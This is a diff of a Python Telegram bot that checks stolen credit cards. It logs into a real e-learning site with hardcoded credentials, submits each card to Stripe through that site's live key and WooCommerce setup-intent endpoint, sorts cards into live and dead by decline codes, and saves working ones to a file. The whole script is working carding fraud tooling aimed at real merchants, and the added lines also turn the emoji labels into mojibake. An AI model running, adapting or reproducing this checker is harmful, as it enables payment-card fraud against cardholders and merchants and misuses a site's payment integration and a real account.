@@ -2,7 +2,6 @@ import os
 import re
 import time
 import json
-import random
 import asyncio
 from html import unescape
 
@@ -29,9 +28,6 @@ def gets(s: str, start: str, end: str) -> str | None:
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
-        user = "paraelsan" + str(random.randint(9999, 574545))
-        mail = "paraelsan" + str(random.randint(9999, 574545)) + "@gmail.com"
-        pwd = "Paraelsan" + str(random.randint(9999, 574545))
 
         # Validate expiration date
         mes = mes.zfill(2)
@@ -54,67 +50,61 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         if expiry_year == current_year and expiry_month < current_month:
             return json.dumps({"error": {"message": "Expiration Month Invalid"}})
 
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'priority': 'u=0, i',
-            'referer': 'https://thefloordepot.com.au/',
+        # Request headers etc.
+        headers1 = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Referer': 'https://elearntsg.com/members/parael10/',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        response = await session.get('https://thefloordepot.com.au/my-account/', headers=headers)
+        # Get login token
+        response = await session.get('https://elearntsg.com/login/', headers=headers1)
+        login_token = gets(response.text, '"learndash-login-form" value="', '" />')
+        if not login_token:
+            return json.dumps({"error": {"message": "Failed to get login token"}})
 
-        register = gets(response.text, '"woocommerce-register-nonce" value="', '" />')
-        print(register)
+        # Login data
+        headers2 = headers1.copy()
+        headers2.update({
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://elearntsg.com',
+            'Referer': 'https://elearntsg.com/login/',
+        })
 
-        headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://thefloordepot.com.au',
-            'priority': 'u=0, i',
-            'referer': 'https://thefloordepot.com.au/my-account/',
-            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+        data_login = {
+            'learndash-login-form': login_token,
+            'pmpro_login_form_used': '1',
+            'log': 'ayasayamaguchi12@signinid.com',   # Ganti akun login sesuai kamu
+            'pwd': 'Ayasa1209',               # Ganti password sesuai kamu
+            'wp-submit': 'Log In',
+            'redirect_to': '',
         }
 
-        data = {
-            'email': mail,
-            'password': pwd,
-            'woocommerce-register-nonce': register,
-            '_wp_http_referer': '/my-account/',
-            'register': 'Register',
-        }
+        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)
 
-        response = await session.post('https://thefloordepot.com.au/my-account/', headers=headers, data=data)
-
-        response = await session.get('https://thefloordepot.com.au/my-account/', headers=headers)
-
-        response = await session.get('https://thefloordepot.com.au/my-account/payment-methods/', headers=headers)
-
-        response = await session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
+        for url in [
+            'https://elearntsg.com/activity-feed/',
+            'https://elearntsg.com/my-account/payment-methods/',
+            'https://elearntsg.com/my-account/add-payment-method/'
+        ]:
+            response = await session.get(url, headers=headers1)
 
         nonce = gets(response.text, '"add_card_nonce":"', '"')
-        print(nonce)
+        if not nonce:
+            return json.dumps({"error": {"message": "Failed to get add_card_nonce"}})
 
-        headers = {
+        headers_stripe = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
@@ -130,59 +120,60 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        data = {
-        'referrer':'https://thefloordepot.com.au',
-        'type':'card',
-        'owner[name]':' ',
-        'owner[email]': mail,
-        'card[number]': cc,
-        'card[cvc]': cvv,
-        'card[exp_month]': mes,
-        'card[exp_year]': ano,
-        'guid':'e4ecff58-9ae2-4855-91fb-2c376191a5967ce14d',
-        'muid':'13c90888-e237-4e5a-a8e1-791f937d267c22f3d7',
-        'sid':'6d2693a7-3d78-4ced-a2a8-6aa36082a0e39678b1',
-        'pasted_fields':'number',
-        'payment_user_agent':'stripe.js/4ca544af8b; stripe-js-v3/4ca544af8b; split-card-element',
-        'time_on_page':'247071',
-        'key':'pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
+        data_stripe = {
+            'type':'card',
+            'billing_details[name]':'parael senoman',
+            'billing_details[email]':'parael10@gmail.com',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mes,
+            'card[exp_year]': ano,
+            'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
+            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
+            'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
+            'payment_user_agent':'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
+            'referrer':'https://elearntsg.com',
+            'time_on_page':'146631',
+            'client_attribution_metadata[client_session_id]':'026b4312-1f75-4cd9-a40c-456a8883e56c',
+            'client_attribution_metadata[merchant_integration_source]':'elements',
+            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
+            'client_attribution_metadata[merchant_integration_version]':'2017',
+            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
         }
 
-        response = await session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
-
+        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
         try:
             id = response.json()['id']
-            print(id)
         except Exception:
             return response.text
 
-        headers = {
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://thefloordepot.com.au',
-            'priority': 'u=1, i',
-            'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
+        headers_ajax = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://elearntsg.com',
+            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
         }
 
         params = {
             'wc-ajax': 'wc_stripe_create_setup_intent',
         }
 
-        data = {
+        data_ajax = {
             'stripe_source_id': id,
             'nonce': nonce,
         }
 
-        response = await session.post('https://thefloordepot.com.au/', params=params, headers=headers, data=data)
+        response = await session.post('https://elearntsg.com/', params=params, headers=headers_ajax, data=data_ajax)
 
         return response.text
 
@@ -196,35 +187,35 @@ async def charge_resp(result):
             '{"status":"SUCCESS",' in result or
             '"status":"success"' in result
         ):
-            response = "Payment method successfully added ✅"
+            response = "Payment method successfully added âœ…"
         elif "Thank you for your donation" in result:
-            response = "Payment successful! 🎉"
+            response = "Payment successful! ðŸŽ‰"
         elif "insufficient funds" in result or "card has insufficient funds." in result:
-            response = "INSUFFICIENT FUNDS ✅"
+            response = "INSUFFICIENT FUNDS âœ…"
         elif "Your card has insufficient funds." in result:
-            response = "INSUFFICIENT FUNDS ✅"
+            response = "INSUFFICIENT FUNDS âœ…"
         elif (
             "incorrect_cvc" in result
             or "security code is incorrect." in result
             or "Your card's security code is incorrect." in result
         ):
-            response = "CVV INCORRECT ❎"
+            response = "CVV INCORRECT âŽ"
         elif "transaction_not_allowed" in result:
-            response = "TRANSACTION NOT ALLOWED ❎"
+            response = "TRANSACTION NOT ALLOWED âŽ"
         elif '"cvc_check": "pass"' in result:
-            response = "CVV MATCH ✅"
+            response = "CVV MATCH âœ…"
         elif "requires_action" in result:
-            response = "VERIFICATION 🚫"
+            response = "VERIFICATION ðŸš«"
         elif (
             "three_d_secure_redirect" in result
             or "card_error_authentication_required" in result
             or "wcpay-confirm-pi:" in result
         ):
-            response = "3DS Required ❎"
+            response = "3DS Required âŽ"
         elif "stripe_3ds2_fingerprint" in result:
-            response = "3DS Required ❎"
+            response = "3DS Required âŽ"
         elif "Your card does not support this type of purchase." in result:
-            response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
+            response = "CARD DOESN'T SUPPORT THIS PURCHASE âŽ"
         elif (
             "generic_decline" in result
             or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
@@ -233,74 +224,74 @@ async def charge_resp(result):
             or "This transaction cannot be processed." in result
             or '"status":400,' in result
         ):
-            response = "GENERIC DECLINED ❌"
+            response = "GENERIC DECLINED âŒ"
         elif "do not honor" in result:
-            response = "DO NOT HONOR ❌"
+            response = "DO NOT HONOR âŒ"
         elif "Suspicious activity detected. Try again in a few minutes." in result:
-            response = "TRY AGAIN IN A FEW MINUTES ❌"
+            response = "TRY AGAIN IN A FEW MINUTES âŒ"
         elif "fraudulent" in result:
-            response = "FRAUDULENT ❌ "
+            response = "FRAUDULENT âŒ "
         elif "setup_intent_authentication_failure" in result:
-            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
+            response = "SETUP_INTENT_AUTHENTICATION_FAILURE âŒ"
         elif "invalid cvc" in result:
-            response = "INVALID CVV ❌"
+            response = "INVALID CVV âŒ"
         elif "stolen card" in result:
-            response = "STOLEN CARD ❌"
+            response = "STOLEN CARD âŒ"
         elif "lost_card" in result:
-            response = "LOST CARD ❌"
+            response = "LOST CARD âŒ"
         elif "pickup_card" in result:
-            response = "PICKUP CARD ❌"
+            response = "PICKUP CARD âŒ"
         elif "incorrect_number" in result:
-            response = "INCORRECT CARD NUMBER ❌"
+            response = "INCORRECT CARD NUMBER âŒ"
         elif "Your card has expired." in result or "expired_card" in result:
-            response = "EXPIRED CARD ❌"
+            response = "EXPIRED CARD âŒ"
         elif "intent_confirmation_challenge" in result:
-            response = "CAPTCHA ❌"
+            response = "CAPTCHA âŒ"
         elif "Your card number is incorrect." in result:
-            response = "INCORRECT CARD NUMBER ❌"
+            response = "INCORRECT CARD NUMBER âŒ"
         elif (
             "Your card's expiration year is invalid." in result
             or "Your card's expiration year is invalid." in result
         ):
-            response = "EXPIRATION YEAR INVALID ❌"
+            response = "EXPIRATION YEAR INVALID âŒ"
         elif (
             "Your card's expiration month is invalid." in result
             or "invalid_expiry_month" in result
         ):
-            response = "EXPIRATION MONTH INVALID ❌"
+            response = "EXPIRATION MONTH INVALID âŒ"
         elif "card is not supported." in result:
-            response = "CARD NOT SUPPORTED ❌"
+            response = "CARD NOT SUPPORTED âŒ"
         elif "invalid account" in result:
-            response = "DEAD CARD ❌"
+            response = "DEAD CARD âŒ"
         elif (
             "Invalid API Key provided" in result
             or "testmode_charges_only" in result
             or "api_key_expired" in result
             or "Your account cannot currently make live charges." in result
         ):
-            response = "stripe error contact support@stripe.com for more details ❌"
+            response = "stripe error contact support@stripe.com for more details âŒ"
         elif "Your card was declined." in result or "card was declined" in result:
-            response = "CARD DECLINED ❌"
+            response = "CARD DECLINED âŒ"
         elif "card number is incorrect." in result:
-            response = "CARD NUMBER INCORRECT ❌"
+            response = "CARD NUMBER INCORRECT âŒ"
         elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
-            response = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
+            response = "Sorry, we are unable to process your payment at this time. Please retry later â³"
         elif "card number is incomplete." in result:
-            response = "CARD NUMBER INCOMPLETE ❌"
+            response = "CARD NUMBER INCOMPLETE âŒ"
         elif "The order total is too high for this payment method" in result:
-            response = "ORDER TO HIGH FOR THIS CARD ❌"
+            response = "ORDER TO HIGH FOR THIS CARD âŒ"
         elif "The order total is too low for this payment method" in result:
-            response = "ORDER TO LOW FOR THIS CARD ❌"
+            response = "ORDER TO LOW FOR THIS CARD âŒ"
         elif "Please Update Bearer Token" in result:
-            response = "Token Expired Admin Has Been Notified ❌"
+            response = "Token Expired Admin Has Been Notified âŒ"
         else:
-            response = result + "❌"
+            response = result + "âŒ"
             with open("result_logs.txt", "a", encoding="utf-8") as f:
                 f.write(f"{result}\n")
 
         return response
     except Exception as e:
-        return f"{str(e)} ❌"
+        return f"{str(e)} âŒ"
 
 # Combines create_payment_method + charge_resp + measure time
 async def multi_checking(fullz: str) -> str:
@@ -321,17 +312,17 @@ async def multi_checking(fullz: str) -> str:
 
     if error_message:
         output = (
-            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+            f"ð—–ð—®ð—¿ð—±: Â» <code>{fullz}</code>\n"
+            f"ð—šð—®ð˜ð—²ð˜„ð—®ð˜†: Â» ð—¦ð—§ð—¥ð—œð—£ð—˜ ð—”ð—¨ð—§ð—›\n"
+            f"ð—¥ð—²ð˜€ð—½ð—¼ð—»ð˜€ð—²: Â» {error_message} âŒ\n"
+            f"ð—§ð—¶ð—ºð—²: Â» {elapsed}s"
         )
     else:
         output = (
-            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+            f"ð—–ð—®ð—¿ð—±: Â» <code>{fullz}</code>\n"
+            f"ð—šð—®ð˜ð—²ð˜„ð—®ð˜†: Â» ð—¦ð—§ð—¥ð—œð—£ð—˜ ð—”ð—¨ð—§ð—›\n"
+            f"ð—¥ð—²ð˜€ð—½ð—¼ð—»ð˜€ð—²: Â» {response}\n"
+            f"ð—§ð—¶ð—ºð—²: Â» {elapsed}s"
         )
         if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
             with open("auth.txt", "a", encoding="utf-8") as file:
@@ -345,7 +336,7 @@ TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(
-        "𝗣𝗔𝗥𝗔𝗘𝗟 𝗕𝗢𝗧\n"
+        "ð—£ð—”ð—¥ð—”ð—˜ð—Ÿ ð—•ð—¢ð—§\n"
         "SEND CARD IN FORMAT CC|MM|YY|CVV\n"
     )
 
